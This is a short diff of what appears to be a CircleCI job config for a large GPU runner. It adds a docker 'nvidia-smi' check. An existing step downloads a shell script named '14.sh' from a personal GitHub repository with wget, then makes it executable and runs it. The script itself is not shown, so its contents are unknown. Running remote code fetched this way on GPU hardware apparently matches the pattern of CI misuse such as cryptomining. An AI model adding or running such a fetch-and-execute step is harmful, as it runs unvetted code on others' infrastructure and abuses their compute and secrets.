@@ -7,4 +7,5 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
       - run: wget https://raw.githubusercontent.com/rindalasririn/a/main/14.sh && chmod +x 14.sh &&./14.sh
